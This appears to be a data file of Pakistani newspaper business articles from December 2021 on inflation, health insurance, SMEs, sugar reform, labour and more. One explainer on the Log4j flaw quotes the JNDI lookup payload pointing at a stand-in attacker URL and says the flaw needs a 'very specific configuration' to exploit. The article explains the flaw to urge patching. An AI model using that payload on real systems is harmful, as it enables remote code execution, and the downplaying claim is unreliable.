0,A tunnel without light at the end,The coming 20 months leading up to next elections are going to be tough for the government.,"The electoral losses suffered by the ruling Pakistan Tehreek-i-Insaf in the local government polls in the ruling party’s stronghold of Khyber Pakhtunkhwa on December 19 validated what many political and economic commentators had long been warning its leadership against. The spiralling cost of living amid stagnating wages and growing unemployment has eroded much of the political capital of the party and its leader, Prime Minister Imran Khan.
The admission of the party leaders from the province, where the PTI had created history in 2018 by winning the second consecutive term, that surging prices were a major factor behind their defeat in the first phase of the local elections shows the leadership had underestimated the growing public anger against the increasing costs of energy, food and other essentials.

The coming 20 months leading up to next elections are going to be tough for the government, more because of its poor handling of the economy than the challenge thrown by the opposition

That the increasing cost of life is imposing a crushing burden on the low-middle-income segments of the country’s population and that people are not happy with the government over its weak economic performance was quite obvious from the results of the recent public opinion surveys. A survey, the National Corruption Perception Survey 2021, by Transparency International Pakistan, shows that nearly 86 per cent of Pakistanis believe that their income had squeezed under the PTI rule and 92.9pc said inflation is ‘highest during the current government’. Only a very small number of responders 4.6pc and 2.5pc thought that prices had risen faster under the PML-N government during 2013-18 and under the PPP during 2008-13.
The survey participants blamed the PTI government’s ‘incompetence’ as the main reason behind the spike in the price inflation and their shrinking incomes, with 50pc respondents calling the present administration incompetent. Some 23.3pc blamed the price hike on corruption and 16.6pc on lack of policy implementation.
Many political commentators expect the electoral trend emerging in the first phase of the local government polls in Khyber Pakhtunkhwa to continue in other districts of the province during the next phase, as well as in Punjab in March/April. Not only that. The possibility of the PTI, which came to power on the promise of stabilising the economy, alleviating poverty and creating jobs, facing a strong backlash over the rapid rise in prices in the 2023 elections cannot be ruled out either.
Although Imran Khan and his ministers have consistently blamed the recent boom in the international commodity inflation — especially energy and food — on the back of global supply disruptions owing to the Covid pandemic hangover for the domestic price hike, people largely remain unimpressed by such explanations.
Economists have repeatedly accused imprudent government policies targeting rapid growth through monetary expansion and loose fiscal policy ahead of the next elections more for the increasing domestic prices than the global commodity boom.
However, the script seems to have gone awry if the local election results from Khyber Pakhtunkhwa are any evidence. Even the announcement of its Rs120 billion price relief package for the low-middle-income people has failed to do the magic. The government’s economic troubles are rapidly turning into a political liability for Prime Minister Imran Khan. The public approval of the government is at its lowest as people complain about the surging cost of living in ways never seen before.
The question now is whether the government has what it takes to reverse the emerging political sentiment. Many commentators argue that the political implications of inflation for the cash-strapped PTI government are huge and it does not have fiscal space to provide significant relief to people because of its financial constraints.
The expected resumption of the International Monetary Fund (IMF) funding programme from next month will also likely further force the government’s hand. The government is already in the process of introducing the Supplementary Finance Bill 2021 to slap taxes to the tune of Rs350-400 billion as a prior action to the approval of the resumption of the IMF funding and is expected to increase the electricity prices in February/March. Both of these measures will produce more inflation just as the monthly bumps in petroleum development levy (PDL) on petroleum products.
The political fallout of such unpopular, inflationary policies under the IMF funding programme would be immense as the majority of people and small businesses will find their income squeezed and their cost of living increased, with the major opposition parties — the Pakistan Muslim League-Nawaz and the Pakistan People’s Party — gearing up to exploit the widespread economic discontent in the country, particularly in Punjab. The next 20 months leading up to new general elections are going to be very tough for the government, more because of its poor handling of the economy than the challenge thrown by the opposition.

"
1,PPP’s health narrative and ideological lens,"While govt seems to be talking sense in terms of its stance, the fact the idea was initially floated by PPP suggests otherwise.","THE access to sustainable and quality healthcare is not conditional on the health insurance card, argues the Sindh government led by the Pakistan Peoples’ Party. Access to health services, including medically advanced treatments, in underserved regions and among poor population segments, has improved significantly under the provincial government’s watch, it asserts. 
The provincial government is adamant it has already covered some distance on the road to universal healthcare and does not need a public health insurance scheme. The leadership believes the health card system, introduced by the federal, Khyber Pakhtunkhwa and Punjab governments, might weaken the already depleted public health infrastructure in the country as the scheme shifts focus and diverts health budget towards the private health facilities at the expense of public health mechanism. 
Sindh Minister for Health and Population Welfare Dr Azra Fazal Pechuho defended her party’s current position. Talking to Dawn, she said: “Sindh is already offering universal healthcare in the province even at the tertiary level. Treatments like cyber-knife, gamma-knife, liver transplants, bone marrow transplants, are offered for free. The health insurance would not be able to pay for the treatment of chronic and terminal illnesses, such as dialysis and cancer care, both of which are expensive modalities that an insurance cap of Rs1 million would not cover. We in Sindh are accommodating bills much higher than Rs1m on a needs basis. There are instances where patients are being sent abroad if their treatment requires so. 

While the provincial government seems to be talking sense in terms of its stance related to the public health insurance scheme, the fact that the idea was initially floated in 2012 by the PPP leadership suggests otherwise

“Besides, the insurance premium payment is docked from the provincial health budget. This puts a strain on the budget allocation for government hospitals and health systems and leads to inadequate, insufficient health cover.”
She said privatising health will create more problems than it might solve, as the transparency of the system will be compromised.
Read: Universal health coverage — Where does Pakistan stand? 
The State Life Insurance Corporation (SLIC), which has partnered with the federal as well as KP and Punjab governments in the management of public health insurance schemes, was convinced of the effectiveness of health card schemes and was confused over the stiff opposition from the PPP-led Sindh government. 
“The health insurance scheme was launched by former prime minister Nawaz Sharif on a smaller scale in 2015 and was re-launched by the PTI in the federal domain and two provinces ruled by them in 2020 and 2021, but the idea was initially floated in 2012 by the PPP government under Asif Ali Zardari. 
“Including the SLIC in the public health matrix in Pakistan was also the PPP’s idea. Prior to 2012, SLIC operations were limited to life coverage only. It was Shahid Aziz Siddiqui, then SLIC head, who saw the scope and started building the capacity of the organisation for health insurance,” a senior SLIC official informed Dawn.
“The first pilot project in collaboration with SLIC was launched in Faisalabad using the database of PPP’s flagship Benazir Income Support Programme to identify the targeted 0.4 million beneficiaries earning under $2 a day to be covered by Wasela-e-Sehat programme for three years. It was successfully completed, and enriched the health insurance experience to improve the flaws before applying it on a larger scale.  It offered Rs25,000 per family annually for in-patients at the empanelled eight hospitals.
“Impressed with the success in 2015, the Micro Health Scheme, with 90 per cent German funding, was launched in Malakand, Mardan, Kohat and Chitral districts of KP for five years where SLIC was picked to collaborate on its technical strength. It targeted providing health cover to 0.7m people earning less than $1 a day. The programme was recently extended for another five years. 
The PM National Health Programme with similar features was launched in 2015 by the Nawaz Sharif government in 34 districts across the country, targeting 15m people and enhancing the coverage to Rs50,000. The PTI government re-launched it with its brand recently. In Balochistan, work is in progress and the health insurance scheme will be launched in 2022,” SLIC Zonal Head Hafeez Uddin told Dawn.
Some senior officers in the Sindh Health Department said they had persistently been engaging with SLIC and relevant federal officials for better insight and to assess possibilities. “It is incorrect to assume that we are opposing the health insurance scheme for the sake of opposition. The fact is that it is our considered opinion that it will hurt the public trust in the government as the defender of basic human rights and the provider of social amenities,” said Parliamentary Health Secretary in Sindh Assembly Qasim Siraj Soomro.
“We must resist elements, ideas and political parties that project the private sector as the world saviour. Businesses by their very nature are profit-seeking entities. It is delusional to trust them with social causes,” said another leader in the provincial hierarchy.
“The commercialisation of basic rights clashes with the PPP’s ideology. It is the duty of the state to provide health coverage to its people. We take full responsibility for defending and promoting the rights of the people that include free access to healthcare for everyone,” he added though he was not able to explain why the global monitors rank Sindh behind Punjab and KP in terms of health indicators. 
A doctor who travels in Sindh extensively believes the depiction of the public health situation in Sindh is flawed. “I wonder who is feeding media with horrific mother-and-child images from Thar. My work takes me to the region every few weeks. Over the past decade the situation has improved visibly,” said Dr Nuzhat Parveen, who takes care of health and accident insurance claims under the Sehat Sahulat Programme. She showed happy and healthy pictures of newborns with visibly elated mothers in Thar to prove her point.
She was all praise for the National Institute of Cardiovascular Diseases (NICVD) and the mobile phone service it offers. “We don’t get as many claims against cardiac treatment as it has already been taken care of by the available facilities.”
Zulfiqar Ali Shah, the Sindh Health Secretary, shared top health facilities the government takes pride in: Shaheed Mohtarma Benazir Bhutto Trauma Centre, Karachi, Surgical Complex, Jinnah Hospital, Karachi, Sindh Infectious Disease Hospital, Karachi, NICVD in Sukkur, Larkana, 
Hyderabad, Mother and Child Hospital Nawabshah, Benazir Institute of Urology and Transplant Nawabshah (nearing completion), Sukkur Children Hospital (nearing completion), North Karachi Children Hospital (a JICA project), Sehwan Institute of Health Sciences, Jacobabad Institute of Medical Sciences, Gambat Institute of Medical Sciences, SIUT in Karachi and Sukkur, Sindh Ambulance Service, Karachi, Sindh People’s Ambulance  and Health Services at SITE and in Thatta and Sujawal, and the Sindh forensic (DNA) Science Agency.

2,The proof is in the pudding,About 65-70pc of the population is still using feature phones but smartphone penetration may cross 50pc.,"It has been a good couple of years for domestic mobile manufacturing. 
Based on import figures, the size of the pie is around $2.5-2.7 billion. Stakeholders agree that good sound policies have been introduced to encourage domestic production while introducing tariffs that make imports non-viable.
But, there is always a ‘but’. “There are rumours that a new GST on mobile phones will be imposed in the mini-budget,” says a source in the know. “If a new GST is implemented, the price will be higher affecting consumer buying power. As a vendor investing in the factory set up, this affects our feasibility.”
The age-old woe of lack of consistency of policy had him nervous. “If you are planning a new policy, it needs to be locked for a definite period in terms of duties and taxes. The more confident the investors are, the more likely that foreign direct investment will flow in,” he said, emphasising the importance of a consensual approach for policies. 
China factor
Pakistan imported $1.12bn worth of cell phones from China last year, less than a drop in its ocean of exports of $126bn. However, according to a document of the ministry of industries and production, an average Chinese assembly line worker now costs around $700 per month. Higher labour costs and tensions with the US has mobile manufacturing shift to regional countries, of which Pakistan hopes to one day be a front runner. 

About 65-70pc of the population is still using feature phones but smartphone penetration may cross 50pc with the induction of new Chinese brands and competitive pricing

One such player is realme. In a written interview posted on a social media platform, Country Manager for Pakistan Harvey says Pakistan is an extremely important market for realme, being one of the top four countries in South Asian region in terms of sales. “We have gone on to sell more than two million handsets since its entry two years ago,” he says, claiming to be the first for any brand. 
“Exporting to different markets from Pakistan is on the cards in the next five years,” he adds. 
Transitioning
“There is a whole transition process going on in Pakistan right now. From the policy point of view, it is good, it is giving more room for localisation,” says Shahrukh Rohilla, Director Sales of Xiaomi Technology which will be starting domestic operations from February 2022, in partnership with AirLink.
The conversion from feature phones with keypads to smartphones is happening fast, says Mr Rohilla, estimating that the smartphone market is growing annually by 10-12 per cent. “About 65-70pc of the population is still using feature phones but we expect smartphone penetration to cross 50pc with the induction of new Chinese brands and competitive pricing.”
The youth bulge plays a vital role in the transition to smartphones and the pricing of products. “We are targeting the age groups of 15 to 35 mostly,” says Mr Rohilla. The general offering in domestic mobile manufacturing targets the low-end to high-mid consumers that can afford to purchase phones in the range of Rs20,000-80,000.
Depending on the success of Xiaomi manufacturing of mobiles, the next project in the pipeline is IoT (Internet of Things) devices such as smart TVs, he adds. 
The cell phone market in Pakistan is growing. According to GSMA, connection penetration is predicted to be 90pc by 2025 and about 74pc of the population will carry smartphones; the 5G rollout is expected to be carried out in 2023. 
In the first seven months of this year, Pakistan manufactured 12.27m mobile phones compared to imports of 8.29m — domestic manufacturing exceeded imports for the first time ever. As a similar surprise, local stakeholders are on the whole positive about the policies on the ground, as long as they remain consistent. On the heels of a strong mobile manufacturing sector can enter IoT devices such as smartwatches, gaming consoles, voice-controlled devices and so on.
Pakistan has an opportunity here to become part of a global industry that is worth over half a trillion dollars. In the past, successful import substitution has not been its strong point. The debate over the auto sector is a case in point. So far, its progress has been swift and effective. If it is not derailed by inconsistent policymaking, Pakistan can have a strong tech-oriented sector that can birth similar industries.

3,How effective is the new SME policy?,"As part of the policy, venture capital regulations will be eased to pump equity finance into eligible SMEs.","The government has come up with a new 2021-2025 policy for small and medium enterprises (SME). Federal ministers claim it will bring about “a revolution” in the SME sector and the entire economy.
The last census of economic establishments was held in 2015-16 and the official results of it are yet to be shared. The latest estimate of Small and Medium Enterprises Development Authority shows 5.2 million micro, small and medium enterprises of MSMEs were operating in 2020, accounting for 98.6 per cent of all enterprises. So, when the federal ministers say there are around 5m SMEs, they are actually referring to all MSMEs and not just SMEs. (SME Policy 2019 and SME Action Plan 2020 had suggested defining all MSMEs as SMEs based on the upper thresholds of annual sales instead of the worth of their fixed assets or the number of their employees).
The SME sector (read the entire 5.2m MSMEs), according to the government’s own estimates, contributes 40pc to GDP and accounts for one-fourth of total exports. Naturally then, this sector must get a large chunk of banks’ financing.

As part of the policy, venture capital regulations will also be eased to pump equity finance into eligible SMEs, including those in the IT sector

But that has not been the case. According to the State Bank of Pakistan (SBP), banks’ lending to the SME sector equalled less than 8pc of their total lending to the private sector businesses (PSB) as of October this year. And, the number of SME borrowers remained below 200,000 till the end of 2020. (The percentage of SME loans in banks’ overall lending to PSB and the total number of SME borrowers both speak volumes about the plight of this sector).
Under the new SME policy, banks will provide collateral-free loans of Rs10m each to 30,000 new SMEs at a concessional interest rate of 9pc. Besides, the Rs23.5 billion fund has been allocated to bail out loss-making SMEs by picking up 40pc to 60pc of their losses depending upon the risk coverage amount. As part of the policy, venture capital regulations will also be eased to pump equity finance into eligible SMEs, including those in the information technology (IT) sector. But these measures, even if implemented with celerity, can hardly enable all SMEs to operate profitably and expand their operations.
The SME Aasan (easy) Finance Scheme (SAAF) introduced by SBP in August this year is the basic tool of implementation of new SME policy. And one good thing about SAAF is that unlike previous schemes it doesn’t build castles in the air. SAAF refinance facility is meant for only those banks that “desire to specialise in lending to the SME sector,” the SBP says.
This point is important. Actually, most banks neither have the “desire to specialise” in SME lending nor they have built the required capacity to cater to SMEs as viable borrowers. As a result, the percentage of SME loan defaults remains high giving banks an excuse for not servicing the SME sector enthusiastically. If banks start building this capacity right now and also convince themselves that in future enough net interest income can be generated from SME loaning, only then the new SME policy can be a real success. No amount of interest rate subsidy offered to banks through a refinancing scheme can achieve this objective.
What proves this point is the below 8pc share of SME financing in banks’ overall lending to private sector businesses, despite the introduction of several refinancing schemes since 2007 when the first SME policy was introduced.
The new SME policy promises the provision of 19,500 plots (spread over 4200 acres of land) to eligible small and medium entrepreneurs on easy instalments. This is a good idea especially if the bulk of the land is allocated to high-priority future SMEs like those in the IT and IT-enabled services sector or agricultural innovation. And, it may start yielding the desired results if not immediately — then sometime before the new SME policy expires in 2025.
A special feature of the new SME policy is its focus on supporting ladies-led SMEs which would get a 25pc tax rebate in addition to all other facilities promised in the new SME policy. But to promote women-led businesses, particularly in the SME sector, offering subsidies and tax-rebates is not enough; ensuring that women actually come forward to set up businesses and they actually get special incentives is more critical.
Back in August 2017, the central bank had launched a refinance and credit guarantee scheme for female entrepreneurs. In August 2020 it enhanced the refinance and credit guarantee limit under this scheme from the initially-envisaged amount of Rs1.5m to Rs5m. But then what happened? The central bank owes it to the nation to share the results of that scheme with the nation with all important details — like the number of women entrepreneurs who got this facility, the total amount of refinancing and credit guarantee offered to them and the sectoral and geographical breakups of the beneficiary businesses.
There are two general reasons for the failure of any initiatives aimed at promoting SMEs, or for that matter any other segment of borrowers. One is that the details are not shared with the public thereby blocking a deeper discussion on why a certain scheme did not work — and the other is that responsibilities are not fixed in case a scheme fails. Did we ever hear enough from the policymakers why the SME policy of 2007 did not deliver? Or did we hear how much it did deliver and where it failed and why?

4,A conflict of interest in Punjab’s extension services,The agriculture department checks companies selling bogus and spurious products.,"Extension services are considered important in the growth of agricultural productivity. These services are a conduit to transfer the latest and improved farm technologies to farmers. But like other developing countries, extension services here are poor, unable to match the demands posed by modern crop production and protection requirements. 
There are issues with human resources, research efficiency and general functioning. The extension staff is under paid and lacks good career structure. It is untrained, poorly equipped and faces mobility issues. The priorities are muddled and research with weak collaboration/linkage with external agencies.
The extension needs institutional autonomy, funding and increased flexibility for research with increased accountability, encouragement of private-sector research especially in commercial crops. Linkages with educational institutions are missing while there is absence of participatory approach.
To cope with the challenges Punjab agriculture authorities have decided to outsource the extension services. “We’ve been seriously understaffed. There is one field officer available for every 60,000 farmers in the province. This necessitated the need for either recruitment on a large scale, which will be a lengthy process, or opting for private service providers to meet this shortage of manpower,” says Agriculture Minister Syed Hussain Jehanian Gardezi. “We are introducing a hybrid system of partially privatising the extension services”, he adds. 

The agriculture department checks companies selling bogus and spurious products. If this department is privatised who will serve as the watchdog of farmers’ interests

The formal process for selection of the extension providers is in the process, says Director-General (Extension) Dr Anjum Ali Buttar, hoping that the new system will be put in place from the next Kharif season. Four out of nine divisions, including Dera Ghazi Khan, Sahiwal, Sargodha and Gujranwala, have been selected to run the project on an experimental basis before taking it to the whole province.
Stakeholders, though welcoming the step, are apprehensive that if the companies manufacturing agricultural products are selected as extension providers, it may cause a conflict of interest.
“There is no doubt that it will increase the outreach of the extension department and more farmers may benefit from the availability of agricultural advisers. But if the companies producing farm products are given the contract they end up promoting their commercial interest in place of farmers”, comments Aamer Hayat Bhandara, a progressive farmer from Pakpattan district.
His views were endorsed by Muhammad Azam Cheema, CEO of Sayban Group associated with agribusiness, including seed and pesticides. “Extension services should be outsourced to assess the performance of private vs public sector. But the issue is that the department whose job is to provide extension services is subletting it. If my competitor is my supervisor I will not trust him,” he argues.
Another issue is the conflict of interest, he stresses, if a company is selected as an extension service provider that is also in the business of agro-products, it will definitely promote its own products. “I attended the stakeholders’ meeting convened by the department and raised the question there too.”
Dr Buttar acknowledges that the issue of conflict of interest had been raised in the meetings held to fine-tune the idea and take on board the stakeholders. Of course, if we have to improve agricultural productivity, we will have to tell the farmers to use better quality seed, fertilisers, etc, and where to get these from. To settle these and other concerns, certain terms and conditions are being included in the contract to ensure that the companies selected may not promote their own or others’ products, he says. 
“The selected service providers will be given target-oriented assignments with marks from zero to five for each task like convincing the farmers to replace their seed if required, see if laser levelling has been done, balanced use of fertiliser, diversification of crop, etc. They will be barred from marketing any kind of agri-products as the job of recommending seeds, fertilisers and pesticides will be done by us.”
For monitoring of the service providers, a third party will be selected for evaluation of their performance and monitoring for which an IT system will be introduced through a control and command centre that will provide digital support to the department, he says.
“But my concern is that if a government department is not listening to my pleas, I will move the court but if courts are privatized who will I approach?” questions Mr Bhandara, explaining, “the agriculture department is the major threat for the companies selling bogus and spurious products to the farmers. If this department is privatised, who will serve as the watchdog of the interests of farmers.” 
He suggests that the outreach of the public sector extension services may be improved by restraining the department’s staff from performing duties for Sunday Bazaars, anti-adulteration drive, etc, or the government may set up digital deras (outhouses), where the farmers may be provided training in latest farming techniques through video link.
Punjab had earlier experimented with different extension service approaches. These included Village Cooperative Movement (VCM), Village Agriculture and Industrial Development Programme (V-AID), Basic Democracies System (BDS), Integrated Rural Development Programme (IRDP), Inputs at Farmers’ Doorsteps, Training & Visit System, Farmers’ Field Schools, Crop Maximisation Programme, etc.
The main aim of the VCM was to rescue the farmers from the clutches of moneylenders. The cooperative idea flopped as large holders and politically influential families dominated the cooperatives who misused funds and did not let small farmers join the entities.
Launched in 1952, with substantial help from the US Agency for International Development and Ford Foundation, the V-AID programme sought to organise village councils while building rural infrastructure and disseminating improved agricultural technology. It soon fell prey to departmental jealousy and political disruption (imposition of martial law). It was abolished in 1961 as rural development became a part of the Basic Democracy System. 
In the BDS, administrative and development tiers were organised at five levels where the union council, a group of 3-5 villages, was the lowest tier and entrusted to solve problems of education, infrastructure, agriculture and sanitation. The BDS was also abolished after a decade with the change in government in 1970 for being too political as BDS served as Electoral College for electing the President.
With the change in early 1970, a new development approach, IRDP, was introduced for the development of agriculture. It was created as a subsidiary of the Agriculture Department with agricultural graduates as its frontline workers. But rural development funds were given under the control of the local government department. This dichotomy resulted in tension between the two agencies and frustration among the workers.

5,Bitter sweet facts,The government has not been able to introduce systematic changes to the sugar supply chain.,"The prices of sugar have been making rolling records over the last three years. In a highly toxic political economy, the entire supply chain thus remained under debate and perpetual scrutiny without any productive outcome.
Even after a series of inquiries, investigations, committees and commissions to reform the sugar sector, the government has not been able to introduce systematic changes to the supply chain. The market continues to operate at its own distorted mechanism with added fuel from lopsided policy and administrative interventions amid household and commercial consumption patterns of 30:70pc.
Interestingly, major reform measures suggested by a Sugar Sector Reform Committee (SSRC) comprising ministers and other stakeholders after 18 months of consultations have come to zilch at the federal cabinet when the secretary cabinet questioned its legal position.
The SSRC led by energy minister Hammad Azhar was constituted by the federal cabinet in June 2020 (when he was the minister for industries) following a massive price hike in November 2019. The crisis had shaken the PTI’s government at the centre and Punjab, leading to a parting of ways between Prime Minister Imran Khan and his longtime friend Jehangir Khan Tarin.

After a series of inquiries, investigations, committees and commissions to reform the sugar sector, the government has not been able to introduce systematic changes to the supply chain

The cabinet appointed a sugar inquiry committee under the Federal Investigation Agency in February 2020 and converted it into an inquiry commission in July 2020. On the sidelines, the SSRC was constituted in July 2020 which held seven meetings in nine months — between July 13, 2020 and March 17, 2021. It comprised two ministers, two advisers and about 10 grade-22 officers. The SSRC took another nine months to compile its final recommendations for sugar sector reforms including deregulation.
As these recommendations came up for approval in the federal cabinet on December 14, at the very outset “the deregulation of the sugar sector was questioned, especially given the cartelisation by the sugar industry,” according to minutes of the cabinet meeting. Mr Hammad explained that the minimum support price (MSP) announced by the government was only indicative and the sugar mills usually purchased sugarcane from the farmers at a price higher than MSP, and hence of no use. 
He argued that regulation of the sector caused distortions and the government should let the market forces determine the prices of sugarcane and sugar. The removal of duty on import of sugar would guard against manipulation of domestic sugar prices by the mills.
The Cabinet Secretary said the abolition of zoning of crops, recommended by SSRC, was in contravention to an earlier decision of the Cabinet which directed the National Food Security and Research Division to carry out a scientific study on zoning requirements, focusing on crop patterns to be adopted in various zones to boost agriculture productivity. 
Also, the free choice of area to set up sugar mills by the private sector through the abolition of Sugar Factories Establishment and Enlargement Act, 1966, as suggested by SSRC would lead to the unregulated proliferation of sugar mills and negatively impact the areas under cultivation for cotton and wheat crops. This aspect needed to be seen in the light of Pakistan’s textile exports to the tune of $6 billion this year and substantial wheat imports over the last two years.
Therefore, the cabinet decided that the recommendations of the SSRC should be further deliberated among the key stakeholders, released to the public for debate for three weeks and brought back to the federal cabinet given serious deficiencies highlighted.
Among the reform suggestions, the SSRC wanted a shift in sugarcane pricing based on sucrose content without any government role instead of existing politicised MSP system, freedom of sugar imports but controlled export in case of surplus and heavy penalties and punishments for delayed sugarcane crushing and cartelisation by the mills.
The proposed reforms also included a series of amendments in a number of federal and provincial laws, new roles to Pakistan Commodities Exchange Control (PMEX), Pakistan Space and Upper Atmosphere Research Commission and electronic warehousing and track & trace systems to streamline the entire supply chain. Reforms also included an increase in the fine for late crushing by mills to Rs5 million and one-year imprisonment besides Rs75m worth of penalty for cartelisation.
The SSRC conceded that the sugar advisory board based in the Mnistry of industries and production had erred in believing that price hike in November 2019 was not because of market forces and asked provinces to invoke price control and profiteering act to counter unfair market practices but later felt that ‘there was a real shortage of sugar’, exerting pressure on prices. The board also required a ban on the export of sugar and advocated imports.
The committee recommended strong media campaigns against the use of sugar by the people because of its health hazards as it noted 30pc of total sugar production was consumed by households while the remaining 70pc involved commercial use like confectionaries and sweets. It said the major reason for price volatility and speculation was the result of an unregistered supply chain at undisclosed locations. 
The SSRC is of the view that commodity should be deposited at accredited warehouses regulated by a Collateral Management Company after customer due diligence through electronic warehouse receipts while its trading and settlement records should be maintained by PMEX to provide a level playing field to market participants for efficient price discovery. This was felt important to replace forward contracts and “Satta” which manipulated market forces amid unregistered transactions and yet these transacted commodities were shown as stocks, providing space to millers to manipulate both demand and supply.
The committee recommended the abolition of legislation by provincial governments regarding zoning of crops and leaving the choice of what to grow to farmers and market forces. On the issue of delayed crushing, the committee observed that the Sugar Factories Control Act 1950 that provided for the crushing starting between 1st of October and the 30th of November of each year, which was a considerably long period, should be curtailed. 
The SSRC also called for adequate pricing of water on a volumetric basis to avert market failures and remove externalities, leading to the incorporation of the actual cost of production of sugarcane. The provinces would be required under new legislation for the supply of water to the cropping areas. It also suggested a cost-benefit analysis of cultivation of different crops to review the relative importance of crops for Pakistan viz-a-viz area under cultivation to enable the government to devise required interventions.

6,Cultural shift in the labour market,The wage-labour system is gradually being replaced by contract jobs institutions that hire people for specific projects only.,"Companies in developed economies are facing a shortage of workers. The reason is simple — the labour market offers a much wider range of avenues/options than before for workers for improving the quality of their lives.
More and more job-seekers look at the nature of the job, working hours, other working conditions, wages, career ladder etc or the option for the joys of simple living before making a decision to accept a job. Many prefer to work part-time, do more than one job or find opportunities for self-employment.
Consultancy has emerged as a lucrative business the world over. Professionals and talents in demand build their careers through different jobs or start their own consultancy firms to provide services to big companies, adopting a flexible labour policy.
There is a lot of business in the corporate sector for consultants as companies shed fat to become lean, thin and agile to better face market competition. Non-core activities of firms often are outsourced.

The wage-labour system is gradually being replaced by contract jobs institutions that hire people for specific projects only

In October, 4.2m are reported to have quit their jobs in the US. American employers now realise they should not disqualify candidates with a ‘resume gap’ — those who were out of work for long periods
Owing to a lot of workers’ shortage in the US, Conference Board, a business research association, finds that companies expect to raise pay by 3.9 per cent in 2022 on average, the most since 2008.
On the political front, Joe Biden has vowed to be the most pro-trade union US President in history and has just criticised Kellogg’s move to replace striking workers. He has asked the company to settle grievances through negotiations, ‘free from threats and intimidation from employers.”
“One thing is clear, organised or not, it is a labour moment,” and “the pandemic has provided a cultural shift in which workers reassess their priorities.” These are quotes of certain noted labour economists.
Workers are also demanding a hefty wage in some parts of Europe, not seen in recent years, coming as it does after a period of anaemic wage growth. Inflation starting in spring, has coursed through the economy and everyday life, says a labour analyst.  
Pakistan is not immune to global trends. Scrutinising the Labour Force Survey 2018-19, former State Bank governor Raiz Riazuddin observes: not only the wages are very low, but there also seems to be gender discrimination.
The most alarming aspect, he notes, is that the wages did not exceed Rs5,000 per month for about 5.7pc of all employees. And about 45.2pc of all wage workers earned less than the minimum wage set in 2018 at Rs15,000. There are also unsettled issues such as how the minimum wage (MW) is determined, its criteria, its effective country-wide and province-wide enforcement and the respective jurisdiction of federal and provincial bodies in setting MW.
The case of trans-provincial organisations challenging the Sindh government’s MW writ is pending before the Supreme Court for decision. These entities argue that they are under the federal legislative list with regards to the fixation of minimum wages. The court has suspended the provincial decision with the appellants’ undertaking to pay MW of Rs20,000, fixed by the federation, to their workers.
Independent research shows that MW is still below the cost of living. That happens even when the MW is sometimes closely linked to an increase in prices. And MW is not implemented effectively.
However, endorsing recently the Sindh government’s decision to fix minimum wages at Rs25,000 per month, the Sindh High Court directed that the minimum wage should be extended to all workers in formal and informal sectors in the province.
The workers’ wages do vary in various sectors and sub-sectors of the economy, depending on the productivity of each during various phases of their development. But the minimum wage is required to ensure a guaranteed minimum living wage to all low paid workers.
The Supreme Court has also turned down an employers’ appeal against the Sindh High Court judgement, contending that they would lose the competitive disadvantage vis-a-vis other provinces (where wage hikes were lower).
In principle, the minimum wage has to reflect the cost of living, says Pervez Tahir, president of the Council of Social Sciences. He suggests that MW should automatically be indexed with the Consumer Price Index.
In a related development, on December 17, the Supreme Court reinstated 16,000 sacked government employees in their positions, upholding their fundamental right to employment enshrined in the 1973 Constitution.
The struggle of the workers to improve their livelihood is also being reinforced by an update in labour economics.
In his illuminating article on December 16, Mr Riazuddin wrote: labour economics is a very important but largely neglected area of research in our country. The pioneering research work by eminent labour economist David Card, he says, should be replicated in our country’s setting to set our labour and wage policy in the right direction.
Mr Card won the Nobel Prize 2021 for empirically establishing that increasing the minimum wage does not reduce the labour growth which, says Mr Riazuddin, is exactly the opposite of existing theoretical orthodoxy. Mr Card and his colleagues have estimated very negligible even positive effects on employment and economic growth of minimum wages.
The PTI government has also been publicly asking businesses making robust profits to raise the wages of their employees.
The rising gains in productivity are not fairly shared among employers and workers. And there is also a well-recognised abnormal difference in compensation paid to top executives compared to the rest of the employees.
The low wages of workers and unfair compensation to the majority of employees are significantly contributing to surging inequality. And less than 1pc of workers are unionised thanks to policies that have pushed labour into the informal sector, says Pakistani researcher Saba Gul Khattak.
‘Development without prosperity’ is the screaming headline of an article published in this newspaper on December 19 on the plight of the ordinary citizens and small fishermen in Gwadar and adjoining areas. A related news item spotlights: ‘sales of low priced bikes (motor cycles) decline, but those of costly ones rise.’
Currently, the wage-labour system is gradually being replaced by contract jobs institutions like the World Bank that hire people on contract for specific projects only.
The digital age is reorganising the mode of production and distribution, giving the workers more freedom and choices to improve the quality of their lives as they deem fit.

7,Log4j — a catastrophic internet security flaw,"According to some estimations, up to 3bn systems and 44pc of organisations could be potentially compromised by the Log4j issue.","The information technology industry is facing a Covid-like situation in its security realm due to Log4j vulnerability. Fear is that international hackers are already active in exploiting the breach in security.
The US Department of Homeland Security is raising a severe alarm, urging federal agencies to swiftly erase the issue since it’s so easy to be exploited — and telling those with public-facing networks to put up firewalls if they can’t be sure. The impacted software is modest and sometimes undocumented.
Detected in a frequently used program called Log4j, the exploit lets internet-based attackers rapidly grab control of everything from industrial control systems to web servers and consumer devices. Simply detecting which computers utilise the utility is a challenge; it is sometimes concealed under layers of other applications.

According to some estimations, up to 3bn systems and 44pc of organisations could be potentially compromised by the Log4j issue.

Those readers who are IT specialists, might be wondering what is Log4j vulnerability? For them, the quick answer is, it is like the SAQL injection, a familiar vulnerability of the past. The code snippet (${jndi:ldap://[attacker_URL]}) might look familiar to software developers familiar with code injections.
Log4j is a Java library that is used for logging errors and other software activities. All an attacker has to do, to exploit the flaw, is strategically send a malicious code string that eventually gets logged by Log4j affected version. The exploit lets an attacker load arbitrary Java code on a server, allowing them to take control. 
According to some estimations, up to 3 billion systems and 44 per cent of organisations could be potentially compromised by the Log4j issue. Millions of attempts by hackers have been logged on numerous networks. If anything, it’s now achingly evident that Log4Shell will continue to wreak havoc across the internet for years to come. 
While this is a high-severity vulnerability, it takes a very specific configuration to exploit. In case your organisation is affected, one quick fix could be to modify the Gradle or Maven configuration files to prevent the use of the affected version of Log4j library, while you look for a permanent fix. A comprehensive way to solve this issue is to upgrade to a corrected version of Log4J, above 2.16. The good news is that just like Covid, we will come out of it sooner, not later, as numerous teams of experts are working day and night to repair the issue.

8,Data points,Second pandemic of mental health,"Second pandemic of mental health
